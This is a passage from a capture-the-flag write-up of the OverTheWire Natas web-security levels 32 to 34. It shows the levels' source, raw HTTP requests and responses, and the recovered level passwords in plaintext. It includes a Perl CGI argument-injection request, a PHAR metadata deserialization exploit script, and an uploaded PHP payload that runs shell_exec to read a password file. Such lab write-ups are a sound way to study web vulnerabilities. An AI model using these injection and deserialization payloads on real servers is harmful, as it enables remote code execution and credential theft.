<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>

<h1>natas32</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>.:
</th></tr><tr><td>bootstrap-3.3.6-dist
</td></tr><tr><td>getpassword
</td></tr><tr><td>index-source.html
</td></tr><tr><td>index.pl
</td></tr><tr><td>jquery-1.12.3.min.js
</td></tr><tr><td>sorttable.js
</td></tr><tr><td>tmp
</td></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

From here, we can find the list of files inside the root directory. 
#### Request Content: 
```
POST /index.pl?./getpassword%20| HTTP/1.1
Host: natas32.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------3730703083708415794798705494
Content-Length: 493
Origin: http://natas32.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMjpOYUlXaFcyVklyS3FyYzdhcm9KVkhPWnZrM1JRTWkwQg==
Connection: keep-alive
Referer: http://natas32.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
Upgrade-Insecure-Requests: 1

-----------------------------3730703083708415794798705494
Content-Disposition: form-data; name="file"

ARGV
-----------------------------3730703083708415794798705494
Content-Disposition: form-data; name="file"; filename="test.csv"
Content-Type: text/csv

col1, col2, col3
row1, row2, row3
row4, row5, row6

-----------------------------3730703083708415794798705494
Content-Disposition: form-data; name="submit"

Upload
-----------------------------3730703083708415794798705494--
```

#### Response Content: 
```
HTTP/1.1 200 OK
Date: Wed, 06 May 2026 13:37:18 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1688
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>

<h1>natas32</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
</th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


### Analysis
This level escalates the previous file-upload logic into a full command execution scenario. The backend CGI script uses file handling in a way that allows attacker-controlled input to be interpreted as command arguments when invoking system-level operations. Because the application does not strictly validate or sanitize the file parameter, it becomes possible to inject arbitrary command-line arguments via crafted POST requests. By manipulating the request structure, the attacker can influence how the backend binary is executed, effectively turning a file upload feature into a command execution primitive. This allows directory listing, file discovery, and eventually execution of the provided getpassword binary to retrieve the next level credential. The key takeaway is that unsafe use of CGI file handles combined with implicit argument passing can directly escalate into remote code execution.


<br><br><br><br><br>







## Natas 33
```
URL: http://natas33.natas.labs.overthewire.org
Username: natas33
Password: 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
```
After login, the webpage displayed: 
```
Can you get it right?
Upload Firmware Update:
```

and request user to select file to upload along with browse and upload file button. 

below is the source code: 
```
 <html>
    <head>
        <!-- This stuff in the header has nothing to do with the level -->
        <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
        <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
        <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
        <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
        <script>var wechallinfo = { "level": "natas33", "pass": "<censored>" };</script></head>
    </head>
    <body>
        <?php
            // graz XeR, the first to solve it! thanks for the feedback!
            // ~morla
            class Executor{
                private $filename=""; 
                private $signature='adeafbadbabec0dedabada55ba55d00d';
                private $init=False;

                function __construct(){
                    $this->filename=$_POST["filename"];
                    if(filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
                        echo "File is too big<br>";
                    }
                    else {
                        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
                            echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
                            echo "Firmware upgrad initialised.<br>";
                        }
                        else{
                            echo "There was an error uploading the file, please try again!<br>";
                        }
                    }
                }

                function __destruct(){
                    // upgrade firmware at the end of this script

                    // "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
                    chdir("/natas33/upload/");
                    if(md5_file($this->filename) == $this->signature){
                        echo "Congratulations! Running firmware update: $this->filename <br>";
                        passthru("php " . $this->filename);
                    }
                    else{
                        echo "Failur! MD5sum mismatch!<br>";
                    }
                }
            }
        ?>

        <h1>natas33</h1>
        <div id="content">
            <h2>Can you get it right?</h2>

            <?php
                session_start();
                if(array_key_exists("filename", $_POST) and array_key_exists("uploadedfile",$_FILES)) {
                    new Executor();
                }
            ?>
            <form enctype="multipart/form-data" action="index.php" method="POST">
                <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
                <input type="hidden" name="filename" value="<?php echo session_id(); ?>" />
                Upload Firmware Update:<br/>
                <input name="uploadedfile" type="file" /><br />
                <input type="submit" value="Upload File" />
            </form>

            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>
```

### Finding 
#### Request Content: 
```
POST /index.php HTTP/1.1
Host: natas33.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------361472542322008640201378821322
Content-Length: 540
Origin: http://natas33.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMzoydjluRGxiU0Y3anZhd2FDbmNyNVo5a1N6a21CZW9DSg==
Connection: keep-alive
Referer: http://natas33.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=dsldf3fhs28anh8153a8tidp1s
Upgrade-Insecure-Requests: 1

-----------------------------361472542322008640201378821322
Content-Disposition: form-data; name="MAX_FILE_SIZE"

4096
-----------------------------361472542322008640201378821322
Content-Disposition: form-data; name="filename"

dsldf3fhs28anh8153a8tidp1s
-----------------------------361472542322008640201378821322
Content-Disposition: form-data; name="uploadedfile"; filename="test.csv"
Content-Type: text/csv

col1, col2, col3
row1, row2, row3
row4, row5, row6

-----------------------------361472542322008640201378821322--
```

#### Response Content: 
```
HTTP/1.1 200 OK
Date: Wed, 06 May 2026 14:01:51 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1659
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
    <head>
        <!-- This stuff in the header has nothing to do with the level -->
        <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
        <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
        <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
        <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
        <script>var wechallinfo = { "level": "natas33", "pass": "2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ" };</script></head>
    </head>
    <body>
        
        <h1>natas33</h1>
        <div id="content">
            <h2>Can you get it right?</h2>

            The update has been uploaded to: /natas33/upload/dsldf3fhs28anh8153a8tidp1s<br>Firmware upgrad initialised.<br>Failur! MD5sum mismatch!<br>            <form enctype="multipart/form-data" action="index.php" method="POST">
                <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
                <input type="hidden" name="filename" value="dsldf3fhs28anh8153a8tidp1s" />
                Upload Firmware Update:<br/>
                <input name="uploadedfile" type="file" /><br />
                <input type="submit" value="Upload File" />
            </form>

            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>
```

The error is obtained: 
```
The update has been uploaded to: /natas33/upload/dsldf3fhs28anh8153a8tidp1s
Firmware upgrad initialised.
Failur! MD5sum mismatch!
```

### Approach 
Create natas33.php with the following code: 
```php
<?php

class Executor{
    private $filename="executor.php"; 
    private $signature=True;
    private $init=False;
}

$phar = new Phar('natas.phar');
$phar -> startBuffering();
$phar -> addFromString('test.txt', 'text');
$phar -> setStub('<?php __HALT_COMPILER(); ?>');

$object = new Executor();
$object -> data = 'rips';
$phar -> setMetadata($object);
$phar -> stopBuffering();

?>
```

Create executor.php with the following code: 
```php
<?php
echo shell_exec('cat /etc/natas_webpass/natas34');
?>
```

use the command below to create a natas.phar file
```bash
php -d phar.readonly=false natas33.php
```

upload the executor.php and rename it from 
```
dsldf3fhs28anh8153a8tidp1s
-----------------------------1534481208277854393192438785
Content-Disposition: form-data; name="uploadedfile"; filename="executor.php"
Content-Type: application/x-php
```

to 

```
executor.php
-----------------------------1534481208277854393192438785
Content-Disposition: form-data; name="uploadedfile"; filename="executor.php"
Content-Type: application/x-php
```

#### Request Content:
```
POST /index.php HTTP/1.1
Host: natas33.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------1534481208277854393192438785
Content-Length: 554
Origin: http://natas33.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMzoydjluRGxiU0Y3anZhd2FDbmNyNVo5a1N6a21CZW9DSg==
Connection: keep-alive
Referer: http://natas33.natas.labs.overthewire.org/index.php
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=dsldf3fhs28anh8153a8tidp1s
Upgrade-Insecure-Requests: 1

-----------------------------1534481208277854393192438785
Content-Disposition: form-data; name="MAX_FILE_SIZE"

4096
-----------------------------1534481208277854393192438785
Content-Disposition: form-data; name="filename"

executor.php
-----------------------------1534481208277854393192438785
Content-Disposition: form-data; name="uploadedfile"; filename="executor.php"
Content-Type: application/x-php

<?php
echo shell_exec('cat /etc/natas_webpass/natas34');
?>

-----------------------------1534481208277854393192438785--
```

#### Response Content: 
```
HTTP/1.1 200 OK
Date: Wed, 06 May 2026 14:15:35 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1645
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
    <head>
        <!-- This stuff in the header has nothing to do with the level -->
        <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
        <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
        <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
        <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
        <script>var wechallinfo = { "level": "natas33", "pass": "2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ" };</script></head>
    </head>
    <body>
        
        <h1>natas33</h1>
        <div id="content">
            <h2>Can you get it right?</h2>

            The update has been uploaded to: /natas33/upload/executor.php<br>Firmware upgrad initialised.<br>Failur! MD5sum mismatch!<br>            <form enctype="multipart/form-data" action="index.php" method="POST">
                <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
                <input type="hidden" name="filename" value="dsldf3fhs28anh8153a8tidp1s" />
                Upload Firmware Update:<br/>
                <input name="uploadedfile" type="file" /><br />
                <input type="submit" value="Upload File" />
            </form>

            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>
```

next, upload the natas.phar, also change the 
```
dsldf3fhs28anh8153a8tidp1s
-----------------------------77836525434011891023222243411
Content-Disposition: form-data; name="uploadedfile"; filename="natas.phar"
Content-Type: application/octet-stream
```

to 

```
natas.phar
-----------------------------77836525434011891023222243411
Content-Disposition: form-data; name="uploadedfile"; filename="natas.phar"
Content-Type: application/octet-stream
```


#### Request Content: 
```
POST /index.php HTTP/1.1
Host: natas33.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------77836525434011891023222243411
Content-Length: 778
Origin: http://natas33.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMzoydjluRGxiU0Y3anZhd2FDbmNyNVo5a1N6a21CZW9DSg==
Connection: keep-alive
Referer: http://natas33.natas.labs.overthewire.org/index.php
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=dsldf3fhs28anh8153a8tidp1s
Upgrade-Insecure-Requests: 1

-----------------------------77836525434011891023222243411
Content-Disposition: form-data; name="MAX_FILE_SIZE"

4096
-----------------------------77836525434011891023222243411
Content-Disposition: form-data; name="filename"

natas.phar
-----------------------------77836525434011891023222243411
Content-Disposition: form-data; name="uploadedfile"; filename="natas.phar"
Content-Type: application/octet-stream

<?php __HALT_COMPILER(); ?>
Æ(binary text)
-----------------------------77836525434011891023222243411--
```

### Response Content: 
```
HTTP/1.1 200 OK
Date: Wed, 06 May 2026 14:19:28 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1643
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
    <head>
        <!-- This stuff in the header has nothing to do with the level -->
        <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
        <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
        <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
        <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
        <script>var wechallinfo = { "level": "natas33", "pass": "2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ" };</script></head>
    </head>
    <body>
        
        <h1>natas33</h1>
        <div id="content">
            <h2>Can you get it right?</h2>

            The update has been uploaded to: /natas33/upload/natas.phar<br>Firmware upgrad initialised.<br>Failur! MD5sum mismatch!<br>            <form enctype="multipart/form-data" action="index.php" method="POST">
                <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
                <input type="hidden" name="filename" value="dsldf3fhs28anh8153a8tidp1s" />
                Upload Firmware Update:<br/>
                <input name="uploadedfile" type="file" /><br />
                <input type="submit" value="Upload File" />
            </form>

            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>
```

next, modify the request just now from 
```
natas.phar
-----------------------------77836525434011891023222243411
Content-Disposition: form-data; name="uploadedfile"; filename="natas.phar"
Content-Type: application/octet-stream
```

to 

```
phar://natas.phar/test.txt
-----------------------------77836525434011891023222243411
Content-Disposition: form-data; name="uploadedfile"; filename="natas.phar"
Content-Type: application/octet-stream
```

#### Request Content: 
```
POST /index.php HTTP/1.1
Host: natas33.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------77836525434011891023222243411
Content-Length: 762
Origin: http://natas33.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMzoydjluRGxiU0Y3anZhd2FDbmNyNVo5a1N6a21CZW9DSg==
Connection: keep-alive
Referer: http://natas33.natas.labs.overthewire.org/index.php
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=dsldf3fhs28anh8153a8tidp1s
Upgrade-Insecure-Requests: 1

-----------------------------77836525434011891023222243411
Content-Disposition: form-data; name="MAX_FILE_SIZE"

4096
-----------------------------77836525434011891023222243411
Content-Disposition: form-data; name="filename"

phar://natas.phar/test.txt
-----------------------------77836525434011891023222243411
Content-Disposition: form-data; name="uploadedfile"; filename="natas.phar"
Content-Type: application/octet-stream

<?php __HALT_COMPILER(); ?>
Æ(binary text)
-----------------------------77836525434011891023222243411--
```


#### Response Content: 
```
HTTP/1.1 200 OK
Date: Wed, 06 May 2026 14:23:24 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 2115
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
    <head>
        <!-- This stuff in the header has nothing to do with the level -->
        <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
        <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
        <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
        <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
        <script>var wechallinfo = { "level": "natas33", "pass": "2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ" };</script></head>
    </head>
    <body>
        
        <h1>natas33</h1>
        <div id="content">
            <h2>Can you get it right?</h2>

            <br />
<b>Warning</b>:  move_uploaded_file(/natas33/upload/phar://natas.phar/test.txt): failed to open stream: No such file or directory in <b>/var/www/natas/natas33/index.php</b> on line <b>27</b><br />
<br />
<b>Warning</b>:  move_uploaded_file(): Unable to move '/var/lib/php/uploadtmp/phpNBFmGg' to '/natas33/upload/phar://natas.phar/test.txt' in <b>/var/www/natas/natas33/index.php</b> on line <b>27</b><br />
There was an error uploading the file, please try again!<br>Failur! MD5sum mismatch!<br>            <form enctype="multipart/form-data" action="index.php" method="POST">
                <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
                <input type="hidden" name="filename" value="dsldf3fhs28anh8153a8tidp1s" />
                Upload Firmware Update:<br/>
                <input name="uploadedfile" type="file" /><br />
                <input type="submit" value="Upload File" />
            </form>

            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>
Congratulations! Running firmware update: executor.php <br>j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY
```




### Analysis
This level demonstrates a combination of insecure file upload handling and a dangerous use of PHP object lifecycle methods (__construct() and __destruct()). The application stores an uploaded file using a user-controlled filename parameter and later performs a security check in the destructor by comparing the MD5 hash of the uploaded file against a hardcoded signature. If the check passes, the server executes the uploaded file via passthru("php " . $this->filename). This creates a clear code execution pathway, but it is gated by a filename-based condition that appears difficult to satisfy directly.

The key vulnerability lies in the fact that the Executor object is destroyed at the end of script execution, meaning attacker-controlled object state influences post-request behavior. Instead of trying to satisfy the MD5 check directly, exploitation leverages PHP’s Phar deserialization feature, where metadata embedded inside a .phar archive can be treated as a serialized object. By crafting a PHAR file containing a malicious Executor object, it becomes possible to control the $filename property during deserialization. This allows bypassing the intended upload logic and manipulating how the destructor behaves when the object is triggered.

Additionally, by abusing stream wrappers such as phar://, the attacker can influence how the server resolves file paths, effectively redirecting file operations to attacker-controlled archive content. This leads to unexpected file handling behavior and ultimately enables execution of a controlled payload through the passthru() call. The challenge highlights a critical PHP security issue: object injection via PHAR metadata combined with unsafe file execution functions can escalate a simple upload feature into remote code execution.

<br><br><br><br><br>






## Natas 34
```
URL: http://natas34.natas.labs.overthewire.org
Username: natas34
Password: j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY
```
The webpage display `Congratulations! You have reached the end... for now.`

Below is the source code of this page: 
```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas34", "pass": "j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY" };</script></head>
<body>
<h1>natas34</h1>
<div id="content">
Congratulations! You have reached the end... for now.
</div>
</body>
</html>
```
